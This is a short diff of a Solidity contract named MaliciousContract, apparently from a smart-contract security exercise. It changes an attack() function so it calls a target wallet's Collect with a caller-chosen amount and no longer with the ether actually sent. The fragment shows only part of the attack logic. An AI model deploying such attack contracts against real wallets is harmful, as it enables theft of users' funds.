@@ -10,9 +10,9 @@ contract MaliciousContract{
         w_WALLET= W_WALLET (_w_Wallet);
     }
 
-    function attack() public payable{
-        require(msg.value >= 1 ether, "Must send at least 1 ether");
-        w_WALLET.Collect(msg.value);
+    function attack(uint amount) public payable{
+        require(amount >= 1 ether, "Must attempt and attack with at least 1 ether");
+        w_WALLET.Collect(amount);
     }
 
     function deposit()  public payable{
